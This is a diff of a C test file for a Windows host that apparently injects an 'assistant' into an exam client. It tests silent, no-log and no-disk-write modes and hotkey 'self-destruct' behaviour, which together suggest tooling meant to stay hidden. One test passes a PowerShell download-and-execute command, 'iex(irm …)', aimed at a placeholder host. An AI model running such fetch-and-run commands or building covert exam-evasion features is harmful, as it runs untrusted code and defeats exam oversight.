@@ -8,6 +8,11 @@ LPWSTR WINAPI test_command_line(void);
 #define proc_launch test_launch
 #define proc_launch_env test_launch_env
 #define proc_stop_owned test_stop_owned
+#define proc_alive test_proc_alive
+#define proc_port_owner_ex test_port_owner_ex
+#define cx_script_lease_active test_lease_active
+#define cx_script_lease_valid test_lease_valid
+#define cx_wipe_clear_file test_clear_file
 #define proc_port_bindable test_bindable
 #define cx_elevation_can_restart test_can_restart
 #define cx_elevation_query test_elevation_query
@@ -60,6 +65,12 @@ static DWORD modeGetterCalls, carrierGetterCalls, portLaunches, proxyLaunches;
 static BOOL launchProxy[8], launchEnvironmentOK, homeFreshOptions, homeSelectedOptions;
 static const WCHAR *expectedDiagnosticScriptInput;
 static BOOL homeExamPage;
+static BOOL fixtureClientAlive, destructOnProbe, expireLeaseOnProbe, leaseFixtureActive, leaseFixtureExpired;
+static DWORD destructTriggers;
+static DWORD clientLogClearCalls;
+static BOOL useOwnedProcessFixture;
+static HANDLE ownedProcessFixture;
+static DWORD ownedProcessFixturePid;
 static WCHAR launchCarriers[8][16], handoffModes[8][16], handoffCarriers[8][16], handoffPaths[8][CX_OPTIONS_PATH_CAP];
 
 static const WCHAR *selected_mode_value(void) {
@@ -129,7 +140,30 @@ BOOL test_dpi_restore(CX_DPI_OVERRIDE *state, WCHAR *error, DWORD cap) {
     if (!dpiRestoreAllowed) h_error(error, cap, L"fixture DPI restore failed");
     return dpiRestoreAllowed;
 }
-DWORD test_stop_owned(DWORD pid) { (void)pid; ++stopped; return 1; }
+DWORD test_stop_owned(DWORD pid) {
+    ++stopped;
+    if (ownedProcessFixture && pid == ownedProcessFixturePid) TerminateProcess(ownedProcessFixture, 0);
+    return 1;
+}
+BOOL test_proc_alive(DWORD pid) {
+    DWORD code;
+    if (ownedProcessFixture && pid == ownedProcessFixturePid)
+        return GetExitCodeProcess(ownedProcessFixture, &code) && code == STILL_ACTIVE;
+    return pid == 4321 && fixtureClientAlive;
+}
+BOOL test_lease_active(void) { return leaseFixtureActive; }
+BOOL test_lease_valid(void) { return !leaseFixtureExpired; }
+BOOL test_clear_file(const WCHAR *path) { (void)path; ++clientLogClearCalls; return TRUE; }
+BOOL test_port_owner_ex(USHORT port, DWORD rootPid, DWORD *owner,
+                       CX_PORT_OWNER_REASON *reason, WCHAR *error, DWORD cap) {
+    (void)port; (void)error; (void)cap;
+    if (destructOnProbe) {
+        destructOnProbe = FALSE;
+        if (cx_silent_hotkey(&h_silent, L"F8")) { ++destructTriggers; h_silent_begin_destruct(FALSE); }
+    }
+    if (expireLeaseOnProbe) { expireLeaseOnProbe = FALSE; leaseFixtureExpired = TRUE; }
+    *owner = rootPid; *reason = CX_PORT_OWNER_VERIFIED; return TRUE;
+}
 
 LPWSTR WINAPI test_command_line(void) { return commandLineFixture; }
 BOOL test_elevation_query(BOOL *elevated) { ++tokenQueries; *elevated = tokenAvailable && tokenElevated; return tokenAvailable; }
@@ -233,6 +267,19 @@ static BOOL test_do_launch(const WCHAR *path, USHORT port, BOOL proxy, DWORD *pi
     launchAt = ++sequence;
     lstrcpyW(launchedPath, path); h_error(error, cap, L"fixture launch failed");
     if (launchFailure == ERROR_SUCCESS) {
+        if (useOwnedProcessFixture) {
+            WCHAR path[CX_OPTIONS_PATH_CAP], command[CX_OPTIONS_PATH_CAP + 4];
+            STARTUPINFOW startup; PROCESS_INFORMATION process;
+            if (!h_parent_dir(h_exe_path, path, CX_OPTIONS_PATH_CAP) || !h_cat(path, CX_OPTIONS_PATH_CAP, L"\\process-fixture.exe")) return FALSE;
+            wsprintfW(command, L"\"%s\"", path); ZeroMemory(&startup, sizeof(startup)); startup.cb = sizeof(startup);
+            ZeroMemory(&process, sizeof(process));
+            if (!CreateProcessW(path, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &startup, &process)) return FALSE;
+            CloseHandle(process.hThread); ownedProcessFixturePid = process.dwProcessId;
+            if (!DuplicateHandle(GetCurrentProcess(), process.hProcess, GetCurrentProcess(), &ownedProcessFixture, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
+                TerminateProcess(process.hProcess, 1); CloseHandle(process.hProcess); return FALSE;
+            }
+            *pid = process.dwProcessId; *handle = process.hProcess; return TRUE;
+        }
         *pid = 4321; *handle = CreateEventW(NULL, TRUE, TRUE, NULL); return *handle != NULL;
     }
     SetLastError(launchFailure); return FALSE;
@@ -281,6 +328,9 @@ static void reset(void) {
     homeCalls = homeExamCalls = 0; homeInside = homeRepeatExam = FALSE; homeInvokesExam = TRUE;
     expectedDiagnosticScriptInput = NULL;
     homeExamPage = FALSE;
+    fixtureClientAlive = destructOnProbe = expireLeaseOnProbe = leaseFixtureActive = leaseFixtureExpired = FALSE;
+    destructTriggers = clientLogClearCalls = 0;
+    useOwnedProcessFixture = FALSE;
     homeNoPreScan = homeNoPendingElevation = homeExamResult = homeSettingsPreserved = FALSE; homeSettingsFixture = NULL;
     h_copy(homeExpectedMode, CX_OPTIONS_SHORT_CAP, L"cdp-port"); h_copy(homeExpectedCarrier, 16, L"auto");
     for (i = 0; i < 4; ++i) { selectionModes[i] = NULL; selectionCarriers[i] = NULL; selectionPaths[i] = NULL; }
@@ -371,6 +421,40 @@ void __stdcall ElevationHostTestMain(void) {
     reset(); testOptions.dpiAware = TRUE; dpiRestoreAllowed = FALSE; launchFailure = ERROR_SUCCESS;
     check(!h_run(&testOptions, h_main_error, HOST_ERROR_CAP) && stopped == 1 && h_report.clientPid == 4321
         && !h_needs_elevation, "DPI restore failure stops only the newly owned client and keeps its PID in report");
+    {
+        int leased;
+        for (leased = 0; leased <= 1; ++leased) {
+            reset(); launchFailure = ERROR_SUCCESS; fixtureClientAlive = destructOnProbe = TRUE;
+            useOwnedProcessFixture = TRUE;
+            leaseFixtureActive = testOptions.stopClientOnExit = leased != 0;
+            testOptions.silentScenario = testOptions.silentDeleteSimulate = testOptions.noDiskWrite = TRUE;
+            testOptions.selfDestructConfirm = FALSE;
+            testOptions.injectModeSet = TRUE; h_copy(testOptions.injectMode, CX_OPTIONS_SHORT_CAP, L"cdp-port");
+            CopyMemory(&h_base_options, &testOptions, sizeof(testOptions));
+            result = h_run(&testOptions, h_main_error, HOST_ERROR_CAP);
+            check(result && destructTriggers == 1 && h_silent_done && !stopped && launches == 1
+                && !lstrcmpA(h_report.stopReason, "self-destruct"), leased
+                ? "self-destruct leaves the owned exam running even with an active lease and stop-client-on-exit"
+                : "self-destruct completes successfully without stopping or relaunching the owned exam");
+            check(!clientLogClearCalls, "simulated self-destruct never deletes or truncates client debug logs");
+            ZeroMemory(&h_report.endpointProbe, sizeof(h_report.endpointProbe));
+            check(!h_selfheal_worthwhile(), "completed self-destruct never qualifies for client restart self-healing");
+            {
+                DWORD code = 0;
+                check(ownedProcessFixture && GetExitCodeProcess(ownedProcessFixture, &code) && code == STILL_ACTIVE,
+                    "the real owned process fixture stays alive after assistant self-destruct returns");
+                if (ownedProcessFixture) {
+                    TerminateProcess(ownedProcessFixture, 0); WaitForSingleObject(ownedProcessFixture, 5000);
+                    CloseHandle(ownedProcessFixture); ownedProcessFixture = NULL; ownedProcessFixturePid = 0;
+                }
+            }
+        }
+    }
+    reset(); launchFailure = ERROR_SUCCESS; fixtureClientAlive = leaseFixtureActive = expireLeaseOnProbe = TRUE;
+    testOptions.noDiskWrite = TRUE; testOptions.injectModeSet = TRUE;
+    h_copy(testOptions.injectMode, CX_OPTIONS_SHORT_CAP, L"cdp-port");
+    check(!h_run(&testOptions, h_main_error, HOST_ERROR_CAP) && stopped == 1 && launches == 1,
+        "lease expiration without self-destruct still stops only the newly owned client");
     reset(); testOptions.dpiAware = TRUE; existingCount = 2;
     check(!h_run(&testOptions, h_main_error, HOST_ERROR_CAP) && processChecks == 1
         && !dpiBegins && !launches && !stopped && !h_needs_elevation
@@ -445,6 +529,12 @@ void __stdcall ElevationHostTestMain(void) {
     check(HostWinMain(NULL, NULL, NULL, 0) == 0 && homeCalls == 1 && homeExamPage && homeExamCalls == 1
         && scans && launches == 1 && !cx_script_lease_active(),
         "silent-debug no-address test reaches real discovery, selection and launch without a script lease");
+    reset(); defaultJson = "{\"quiet\":true,\"noDiskWrite\":true}";
+    commandLineFixture = L"host.exe --silent-scenario --silent-delete-simulate --scan-mode fallback-all --client-first --execution-mode memory --no-disk-write --no-log --quiet --no-panel --self-destruct-key Ctrl+Alt+Shift+E --self-destruct-key F8 --no-self-destruct-confirm";
+    launchFailure = ERROR_ACCESS_DENIED;
+    check(HostWinMain(NULL, NULL, NULL, 0) == 1 && !homeCalls && scans == 1 && launches == 1
+        && h_base_options.selfDestructKeyCount == 2,
+        "formal silent entry reaches the actual exam launch without a diagnostics or homepage window");
     reset(); defaultJson = "{\"quiet\":true,\"noDiskWrite\":true}";
     commandLineFixture = L"host.exe --exam-test \"powershell -c \\\"iex(irm https://fixture.invalid/script)\\\"\" --duration 321";
     expectedDiagnosticScriptInput = L"powershell -c \"iex(irm https://fixture.invalid/script)\"";
